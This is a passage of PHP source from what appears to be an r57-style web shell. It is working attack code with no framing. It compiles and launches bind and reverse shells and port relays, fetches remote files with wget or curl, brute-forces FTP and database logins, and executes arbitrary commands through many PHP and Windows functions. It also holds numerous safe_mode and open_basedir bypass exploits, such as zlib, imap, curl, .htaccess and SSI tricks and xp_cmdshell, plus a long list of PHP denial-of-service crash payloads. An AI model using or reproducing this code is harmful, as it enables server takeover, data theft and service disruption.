 if(!$file=@fopen($_POST['e_name'],"w")) { err(0,$_POST['e_name']); }
 else {
 if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 @fwrite($file,$_POST['e_text']);
 @touch($_POST['e_name'],$mtime,$mtime);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=White><tr><td class=main bgcolor=Black><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 }

if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
}
if (!empty($_POST['php_ini1']))
{
 cf("php.ini",$php_ini1);
  $_POST['cmd']=" Da write xong php.ini thu? thu? coi di";
 }

 if (!empty($_POST['htacces']))
{
 cf(".htaccess",$htacces);
  $_POST['cmd']="Da write xong htaccess thu? thu? coi di ";
 }
  if (!empty($_POST['file_ini']))
{
 cf("ini.php",$sni_res);

  $_POST['cmd']=" http://target.com/ini.php?ss=http://shell.txt? Da write xong ini.php thu xem ^^!";
 }
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(!empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("<font color=White face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case fetch:
 $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
 break;
 case lynx:
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case links:
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case GET:
 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case curl:
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
if(!empty($_POST['cmd']) && ($_POST['cmd']=="ftp_file_up" || $_POST['cmd']=="ftp_file_down"))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { err(3); }
 else
  {
  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }
  else
   {
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.((!$unix)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);	}
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);	}
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }

 if(!empty($_POST['cmd']) && (($_POST['cmd']=="ftp_brute") || ($_POST['cmd']=="db_brute")))
  {
  if($_POST['cmd']=="ftp_brute"){
   list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
   if(empty($ftp_port)) { $ftp_port = 21; }
   $connection = @ftp_connect ($ftp_server,$ftp_port,10);
  }else if($_POST['cmd']=="db_brute"){
    $connection = 1;
  }
  if(!$connection) { err(3); $_POST['cmd'] = ""; }
  else if(($_POST['brute_method']=='passwd') && (!$users=get_users('/etc/passwd'))){ echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
  else if(($_POST['brute_method']=='dic') && (!$users=get_users($_POST['dictionary']))){ echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><font color=red face=Verdana size=-2><div align=center><b>Can\'t get password list</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
  if($_POST['cmd']=="ftp_brute"){@ftp_close($connection);}
 }

 echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td class=main><b><div align=center><textarea name=report cols=121 rows=15>";

function dozip1($link,$file)
{
   $fp = @fopen($link,"r");
   while(!feof($fp))
   {
       $cont.= fread($fp,1024);
   }
   fclose($fp);

   $fp2 = @fopen($file,"w");
   fwrite($fp2,$cont);
   fclose($fp2);
}
if (isset($_POST['funzip']))
{
dozip1($_POST['funzip'],$_POST['fzip']);
}
if(empty($_POST['root'])){
} else {
   $root = $_POST['root']; }




  $c = 0; $D = array();
  set_error_handler("eh");

  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

  for($i=0; $i < strlen($chars); $i++){
  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}";

  $prevD = $D[count($D)-1];
  glob($path."*");

        if($D[count($D)-1] != $prevD){

        for($j=0; $j < strlen($chars); $j++){

           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}";

           $prevD2 = $D[count($D)-1];
           glob($path."*");

              if($D[count($D)-1] != $prevD2){


                 for($p=0; $p < strlen($chars); $p++){

                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";

                 $prevD3 = $D[count($D)-1];
                 glob($path."*");

                    if($D[count($D)-1] != $prevD3){


                       for($r=0; $r < strlen($chars); $r++){

                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                       glob($path."*");

                       }

                    }

                 }

              }

        }

        }

  }

  $D = array_unique($D);




  foreach($D as $item)
  if(isset($_REQUEST['root']))
  echo "{$item}\n";




  function eh($errno, $errstr, $errfile, $errline){

     global $D, $c, $i;
     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
     if($o){ $D[$c] = $o[2]; $c++;}

  }

if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
   }
  else echo $lang[$language._text29];
 break;
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test4':
  if(empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table r57_temp_table",$db);
     @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from r57_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo $row[0]."\r\n";
      }
    @mssql_query("drop table r57_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'test5':
  if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');
  $extra = "-C ".$_POST['test5_file']." -X /tmp/mb_send_mail";
  @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
  $lines = file ('/tmp/mb_send_mail');
  foreach ($lines as $line) { echo htmlspecialchars($line)."\r\n"; }
  break;
  case 'test6':
  $stream = @imap_open('/etc/passwd', "", "");
  $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
  for ($i = 0; $i < count($dir_list); $i++) echo $dir_list[$i]."\r\n";
  @imap_close($stream);
  break;
  case 'test7':
  $stream = @imap_open($_POST['test7_file'], "", "");
  $str = @imap_body($stream, 1);
  echo $str;
  @imap_close($stream);
  break;
  case 'test8':
  if(@copy("compress.zlib://".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];
  else echo $lang[$language.'_text119'];
  break;
case 'cURL':
   if(empty($_POST['SnIpEr_SA'])){


} else {
$curl=$_POST['SnIpEr_SA'];
$ch =curl_init("file:///".$curl."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "</textarea></CENTER>";

}
break;
case 'copy':

if(empty($snn)){
if(empty($_GET['snn'])){
if(empty($_POST['snn'])){

} else {
$u1p=$_POST['snn'];
}
} else {
$u1p=$_GET['snn'];
}
}
  $u1p=""; 
$tymczas=""; 


$temp=tempnam($tymczas, "cx");

if(copy("compress.zlib://".$snn, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
echo "</textarea></CENTER>";
}
break;
case 'ini_restore':
 if(empty($_POST['ini_restore'])){
} else {

$ini=$_POST['ini_restore'];
echo ini_get("safe_mode");
echo ini_get("open_basedir");
require_once("$ini");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["ss"]);
echo "</textarea></CENTER>";
}
break;
case 'glob':
function reg_glob()
{
$chemin=$_REQUEST['glob'];
$files = glob("$chemin*");


foreach ($files as $filename) {

   echo "$filename\n";

}
}

if(isset($_REQUEST['glob']))
{
reg_glob();
}

break;
case 'zend':
 if(empty($_POST['zend'])){
} else {

$dezend=$_POST['zend'];
include($_POST['zend']);
print_r($GLOBALS);
require_once("$dezend");
echo "</textarea></p>";
}
break;
  case 'plugin':
  if ($_POST['plugin'] ){


                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "</textarea>";

             }
        break;
        case 'command':
          if (!empty($_POST['command'])) {

                if ($method=="system") {
                system($_POST['command']);
                echo "Functions system";
                }
                if ($method=="passthru") {
                passthru($_POST['command']);
                echo "Functions passthru";
                }
                if ($method=="exec") {
                        $string = exec($_POST['command']);
                        echo $string;
                        echo "Functions exec";

                }
                if ($method=="shell_exec") {
                $string = shell_exec($_POST['command']);
                echo $string;
                echo "Functions shell_exec";
                }
                if ($method=="popen") {
                $pp = popen($_POST['command'], 'r');
                $read = fread($pp, 2096);
                echo $read;
                pclose($pp);
                echo "Functions popen";
                  }

	  if ($method=="proc_open") {


$command  = isset($_POST['command'])  ? $_POST['command']  : '';




session_start();

    if (!empty($command)) {
        if (($i = array_search($_POST['command'], $_SESSION['history'])) !== false)
            unset($_SESSION['history'][$i]);

        array_unshift($_SESSION['history'], $_POST['command']);

        $_SESSION['output'] .= '$ ' . $_POST['command'] . "\n";

        if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_POST['command'])) {
            $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
        } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_POST['command'], $regs)) {

            if ($regs[1]{0} == '/') {
                $new_dir = $regs[1];
            } else {
                $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
            }

            while (strpos($new_dir, '/./') !== false)
                $new_dir = str_replace('/./', '/', $new_dir);

            while (strpos($new_dir, '//') !== false)
                $new_dir = str_replace('//', '/', $new_dir);

            while (preg_match('|/\.\.(?!\.)|', $new_dir))
                $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);

            if ($new_dir == '') $new_dir = '/';

            if (@chdir($new_dir)) {
                $_SESSION['cwd'] = $new_dir;
            } else {
                $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
            }

        } elseif (trim($_POST['command']) == 'exit') {
            logout();
        } else {

            chdir($_SESSION['cwd']);

            if (!ini_get('safe_mode')) {
                putenv('ROWS=' . $rows);
                putenv('COLUMNS=' . $columns);
            }

            $length = strcspn($_POST['command'], " \t");
            $token = substr($_POST['command'], 0, $length);
            if (isset($ini['aliases'][$token]))
                $command = $ini['aliases'][$token] . substr($_POST['command'], $length);

            $io = array();
            $p = proc_open($_POST['command'],
                           array(1 => array('pipe', 'w'),
                                 2 => array('pipe', 'w')),
                           $io);

            while (!feof($io[1])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                        ENT_COMPAT, 'UTF-8');
            }
            while (!feof($io[2])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                        ENT_COMPAT, 'UTF-8');
            }

            fclose($io[1]);
            fclose($io[2]);
            proc_close($p);
        }
    }

    if (empty($_SESSION['history'])) {
        $js_command_hist = '""';
    } else {
        $escaped = array_map('addslashes', $_SESSION['history']);
        $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
    }
               }
             		}


		break;
  case 'test10':
  @error_log($_POST['test10_content'], 3,"php://../../".$_POST['test10_file']);
  break;
  case 'test11':
  if(file_exists("./result.txt") && file_exists("./.htaccess"))
   {
   @unlink("./.htaccess");
   @unlink("./result.txt");
   }
   if ($handle = @fopen("./.htaccess", 'w')) { @fwrite($handle, "php_value mail.force_extra_parameters '-t && ".$_POST['test11_cmd']." > ".dirname($_SERVER["SCRIPT_FILENAME"])."/result.txt'"); mail("", "", ""); }
   //while(!file_exists(dirname($_SERVER["SCRIPT_FILENAME"])."/result.txt")) sleep(1);
   if($lines) foreach ($lines as $line) { echo htmlspecialchars($line); }
  break;
  case 'test12':
  if ($handle = @fopen("./.htaccess", 'w')) { @fwrite($handle, "AddType text/html .shtml\r\nAddHandler server-parsed .shtml\r\nOptions +Includes"); }
  if ($handle = @fopen("./cmdssi.shtml", 'w')) { @fwrite($handle, '<!--#exec cmd="'.$_POST['test12_cmd'].'"-->'); }
  @include("http://".$_SERVER['HTTP_HOST'].rtrim(dirname($_SERVER['PHP_SELF']),'/\\')."/cmdssi.shtml");
  break;
  case 'test13':
  $tmp = '';
  if(@is_writable($_ENV['TMP'])) $tmp=$_ENV['TMP'];
  elseif(@is_writeable(ini_get('session.save_path'))) $tmp=ini_get('session.save_path');
  elseif(@is_writeable(ini_get('upload_tmp_dir'))) $tmp=ini_get('upload_tmp_dir');
  elseif(@is_writeable(dirname(__FILE__))) $tmp=dirname(__FILE__);
  else break;
  @unlink($tmp.'/result_test13.txt');
  $wscript = new COM('wscript.shell');
  $wscript->Run('cmd.exe /c "'.$_POST['test13_cmd'].'" > '.$tmp.'/result_test13.txt');
  while(!file_exists($tmp.'/result_test13.txt')) sleep(1);
  $lines = @file ($tmp.'/result_test13.txt');
  if($lines) foreach ($lines as $line) { echo htmlspecialchars($line); }
  @unlink($tmp.'/result_test13.txt');
  break;
  case 'test14':
  $ioncube = @ioncube_read_file($_POST['test14_cmd']);
  echo htmlspecialchars($ioncube);
  break;
  case 'test15':
  $tmp = '';
  if(@is_writable($_ENV['TMP'])) $tmp=$_ENV['TMP'];
  elseif(@is_writeable(ini_get('session.save_path'))) $tmp=ini_get('session.save_path');
  elseif(@is_writeable(ini_get('upload_tmp_dir'))) $tmp=ini_get('upload_tmp_dir');
  elseif(@is_writeable(dirname(__FILE__))) $tmp=dirname(__FILE__);
  else break;
  @unlink($tmp.'/result_test15.txt');
  @win_shell_execute("cmd.exe","","/c ".$_POST['test15_cmd']." > ".$tmp."/result_test15.txt");
  while(!file_exists($tmp.'/result_test15.txt')) sleep(1);
  $lines = @file ($tmp.'/result_test15.txt');
  if($lines) foreach ($lines as $line) { echo htmlspecialchars($line); }
  @unlink($tmp.'/result_test15.txt');
  break;
  case 'test16':
  $tmp = '';
  if(@is_writable($_ENV['TMP'])) $tmp=$_ENV['TMP'];
  elseif(@is_writeable(ini_get('session.save_path'))) $tmp=ini_get('session.save_path');
  if(@is_writeable(ini_get('upload_tmp_dir'))) $tmp=ini_get('upload_tmp_dir');
  elseif(@is_writeable(dirname(__FILE__))) $tmp=dirname(__FILE__);
  else break;
  $name=$tmp."\\".uniqid();
  $n=uniqid();
  $cmd=(empty($_SERVER['COMSPEC']))?'c:\\windows\\system32\\cmd.exe':$_SERVER['COMSPEC'];
  win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c ".$_POST['test16_cmd']." >\"$name\""));
  win32_start_service($n);
  win32_stop_service($n);
  win32_delete_service($n);
  while(!file_exists($name)) sleep(1);
  $exec=file_get_contents($name);
  unlink($name);
  echo htmlspecialchars($exec);
  break;
  case 'test17':
  $_POST['test17_cmd'] = str_replace('\\','\\\\',$_POST['test17_cmd']);
  $perl = new Perl();
  $perl->eval('print `'.$_POST['test17_cmd'].'`');
  break;
  case 'test18':
  if(@is_writable($_ENV['TMP'])) $tmp=$_ENV['TMP'];
  elseif(@is_writeable(ini_get('session.save_path'))) $tmp=ini_get('session.save_path');
  if(@is_writeable(ini_get('upload_tmp_dir'))) $tmp=ini_get('upload_tmp_dir');
  elseif(@is_writeable(dirname(__FILE__))) $tmp=dirname(__FILE__);
  else break;
  $name=$tmp."\\".uniqid();
  $api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
  $res=$api->WinExec("cmd.exe /c ".$_POST['test18_cmd']." >\"$name\"",0);
  while(!file_exists($name)) sleep(1);
  $exec=file_get_contents($name);
  unlink($name);
  echo htmlspecialchars($exec);
  break;
  case 'test19':

if(Empty($test19) aNd Empty($_GET['test19']) aNd Empty($_POST['test19'])) diE("\n".$karatonik);

if(!empty($_GET['test19'])) $file=$_GET['test19'];
if(!empty($_POST['test19'])) $file=$_POST['test19'];


if((curl_exec(curl_init("file:http://../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../".$file))) aNd !emptY($file)) die("<B><br>Ngu trong rung</B></FONT>");
elseif(!emptY($file)) die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
<B>".htmlspecialchars($file)."</B> doesn't exists or you don't have
permissions.</CENTER></FONT>");Beark;
case 'test20':
@ob_clean();
  $error_reporting = @ini_get('error_reporting');
  error_reporting(E_ALL ^ E_NOTICE);
  @ini_set("display_errors", 1);
  @ini_alter("display_errors", 1);
  $str=@fopen($_POST['test20_file'],"r");
  while(!feof($str)){print htmlspecialchars(fgets($str));}
  fclose($str);
  error_reporting($error_reporting);
  break;
case 'test21':
$filen=$_POST['test21_file'];
@fopen('srpath://../../../../../../../../../../../'.$_POST['test21_file'],"a");
if (file_exists($filen))
{
echo $lang[$language.'_text61'];
}
else
echo "Can't write file";

  break;
case 'test22':
       echo "PHP realpath() listing directory Safe_mode bypass Exploit\r\n\r\n";
       if(!$dir){$dir='/etc/';};
       if(!empty($_POST['end_rlph'])){$end_rlph=$_POST['end_rlph'];}else{$end_rlph='';}
       if(!empty($_POST['n_rlph'])){$n_rlph=$_POST['n_rlph'];}else{$n_rlph='3';}

       if($realpath=realpath($dir.'/')){echo $realpath."\r\n";}
       if($end_rlph!='' && $realpath=realpath($dir.'/'.$end_rlph)){echo $realpath."\r\n";}
       foreach($presets_rlph as $preset_rlph){
           if($realpath=realpath($dir.'/'.$preset_rlph.$end_rlph)){echo $realpath."\r\n";}
       }
       for($i=0; $i < strlen($chars_rlph); $i++){
          if($realpath=realpath($dir."/{$chars_rlph[$i]}".$end_rlph)){echo $realpath."\r\n";}
          if($n_rlph<=1){continue;};
          for($j=0; $j < strlen($chars_rlph); $j++){
             if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}".$end_rlph)){echo $realpath."\r\n";}
             if($n_rlph<=2){continue;};
      	     for($x=0; $x < strlen($chars_rlph); $x++){
                if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}".$end_rlph)){echo $realpath."\r\n";}
                if($n_rlph<=3){continue;};
                for($y=0; $y < strlen($chars_rlph); $y++){
      	           if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}".$end_rlph)){echo $realpath."\r\n";}
      	           if($n_rlph<=4){continue;};
      	           for($z=0; $z < strlen($chars_rlph); $z++){
      	              if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}".$end_rlph)){echo $realpath."\r\n";}
      	              if($n_rlph<=5){continue;};
      	              for($w=0; $w < strlen($chars_rlph); $w++){
      	                 if($realpath=realpath($dir."/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}{$chars_rlph[$w]}".$end_rlph)){echo $realpath."\r\n";}
      		      }
      		   }
      	         }
              }
          }
       }
       echo "\r\n Generation time: ".round(@getmicrotime()-starttime,4)." sec\r\n";
 break;
case 'test23':
  @session_save_path($_POST['test23_file2']."\0;$tempdir");
  @session_start();
  @$_SESSION[php]=$_POST['test23_file1'];
  $filen=$_POST['test23_file2'];
    if(file_exists($filen))
    echo $lang[$language.'_text61']."  ".$filen;
    else
  echo "Can't write file";
  break;
case 'test24':
@putenv("TMPDIR=".$_POST['test24_file2']);
  @ini_set("session.save_path", "");
  @ini_alter("session.save_path", "");
  @session_start();
  @$_SESSION[php]=$_POST['test24_file1'];
  $filen=$_POST['test24_file2'];
  if(file_exists($filen))
  echo $lang[$language.'_text61']."  ".$filen;
  else
  echo "Can't write file";
  break;
case 'test25':
  @readfile($_POST['test25_file1'], 3, "php://../../../../../../../../../../../".$_POST['test24_file2']);
  $filen=$_POST['test25_file2'];
  if(file_exists($filen))
  echo $lang[$language.'_text61'];
  else
  echo "Can't write file";
  break;
break;

 }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if(!$unix) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}

 switch($_POST['cmd'])
 {
  case 'dos1':
  function a() { a(); } a();
  break;
  case 'dos2':
  @pack("d4294967297", 2);
  break;
  case 'dos3':
  $a = "a";@unserialize(@str_replace('1', 2147483647, @serialize($a)));
  break;
  case 'dos4':
  $t = array(1);while (1) {$a[] = &$t;};
  break;
  case 'dos5':
  @dl("sqlite.so");$db = new SqliteDatabase("foo");
  break;
  case 'dos6':
  preg_match('/(.(?!b))*/', @str_repeat("a", 10000));
  break;
  case 'dos7':
  @str_replace("A", str_repeat("B", 65535), str_repeat("A", 65538));
  break;
  case 'dos8':
  @shell_exec("killall -11 httpd");
  break;
  case 'dos9':
  function cx(){ @tempnam("/www/", '../../../../../..'.$tempdir.'cx'); cx(); } cx();
  break;
  case 'dos10':
  $a = @str_repeat ("A",438013);$b = @str_repeat ("B",951140);@wordwrap ($a,0,$b,0);
  break;
  case 'dos11':
  @array_fill(1,123456789,"Infigo-IS");
  break;
  case 'dos12':
  @substr_compare("A","A",12345678);
  break;
  case 'dos13':
  @unserialize("a:2147483649:{");
  break;
  case 'dos14':
  $Data = @str_ireplace("\n", "<br>", $Data);
  break;
  case 'dos15':
  function toUTF($x) {return chr(($x >> 6) + 192) . chr(($x & 63) + 128);}
  $str1 = "";for($i=0; $i < 64; $i++){ $str1 .= toUTF(977);}
  @htmlentities($str1, ENT_NOQUOTES, "UTF-8");
  break;
  case 'dos16':
  $r = @zip_open("x.zip");$e = @zip_read($r);$x = @zip_entry_open($r, $e);
  for ($i=0; $i<1000; $i++) $arr[$i]=array(array(""));
  unset($arr[600]);@zip_entry_read($e, -1);unset($arr[601]);
  break;
  case 'dos17':
  $z = "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU";
  $y = "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD";
  $x = "AQ                                                                        ";
  unset($z);unset($y);$x = base64_decode($x);$y = @sqlite_udf_decode_binary($x);unset($x);
  break;
  case 'dos18':
  $MSGKEY = 519052;$msg_id = @msg_get_queue ($MSGKEY, 0600);
  if (!@msg_send ($msg_id, 1, 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH', false, true, $msg_err))
  echo "Msg not sent because $msg_err\n";
  if (@msg_receive ($msg_id, 1, $msg_type, 0xffffffff, $_SESSION, false, 0, $msg_error)) {
  echo "$msg\n";
  } else { echo "Received $msg_error fetching message\n"; break; }
  @msg_remove_queue ($msg_id);
  break;
  case 'dos19':
  $url = "php://filter/read=OFF_BY_ONE./resource=/etc/passwd"; @fopen($url, "r");
  break;
  case 'dos20':
  $hashtable = str_repeat("A", 39);
  $hashtable[5*4+0]=chr(0x58);$hashtable[5*4+1]=chr(0x40);$hashtable[5*4+2]=chr(0x06);$hashtable[5*4+3]=chr(0x08);
  $hashtable[8*4+0]=chr(0x66);$hashtable[8*4+1]=chr(0x77);$hashtable[8*4+2]=chr(0x88);$hashtable[8*4+3]=chr(0x99);
  $str = 'a:100000:{s:8:"AAAABBBB";a:3:{s:12:"0123456789AA";a:1:{s:12:"AAAABBBBCCCC";i:0;}s:12:"012345678AAA";i:0;s:12:"012345678BAN";i:0;}';
  for ($i=0; $i<65535; $i++) { $str .= 'i:0;R:2;'; }
  $str .= 's:39:"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";s:39:"'.$hashtable.'";i:0;R:3;';
  @unserialize($str);
  break;
  case 'dos21':
  imagecreatetruecolor(1234,1073741824);
  break;
  case 'dos22':
  imagecopyresized(imagecreatetruecolor(0x7fffffff, 120),imagecreatetruecolor(120, 120), 0, 0, 0, 0, 0x7fffffff, 120, 120, 120);
  break;
  case 'dos23':
  $a = str_repeat ("A",9989776); $b = str_repeat("/", 2798349); iconv_substr($a,0,1,$b);
  break;
  case 'dos24':
  setlocale(LC_COLLATE, str_repeat("A", 34438013));
  break;
  case 'dos25':
  glob(str_repeat("A", 9638013));
  break;
  case 'dos26':
  glob("a",-1);
  break;
  case 'dos27':
  fnmatch("*[1]e", str_repeat("A", 9638013));
  break;
